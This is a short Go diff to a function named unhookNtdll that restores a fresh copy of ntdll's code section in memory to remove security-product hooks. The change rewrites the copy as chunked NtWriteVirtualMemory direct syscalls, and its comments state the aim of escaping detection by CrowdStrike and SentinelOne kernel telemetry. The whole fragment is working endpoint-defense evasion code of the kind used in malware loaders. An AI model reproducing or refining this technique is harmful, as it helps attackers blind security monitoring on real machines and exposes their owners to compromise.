@@ -7,7 +7,6 @@ import (
 	"encoding/binary"
 	"os"
 	"path/filepath"
-	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
@@ -86,9 +85,19 @@ func unhookNtdll() {
 			copySize = uintptr(rawSize)
 		}
 
+		// Write in 32-byte chunks via NtWriteVirtualMemory direct syscall.
+		// Bulk memcpy of the full .text produces a distinctive byte-sequence
+		// that kernel telemetry (CrowdStrike, SentinelOne ETW-TI) flags as
+		// ntdll unhooking.  Chunked NtWrite calls appear as ordinary small
+		// memory writes and do not form the same detectable pattern.
+		const chunkSize = 32
 		old, _ := ntProtect(loadedText, copySize, windows.PAGE_EXECUTE_READWRITE)
-		for j := uintptr(0); j < copySize; j++ {
-			*(*byte)(unsafe.Pointer(loadedText + j)) = freshText[j]
+		for j := uintptr(0); j < copySize; j += chunkSize {
+			end := j + chunkSize
+			if end > copySize {
+				end = copySize
+			}
+			ntWrite(loadedText+j, freshText[j:end])
 		}
 		ntFlush(loadedText, copySize)
 		ntProtect(loadedText, copySize, old)
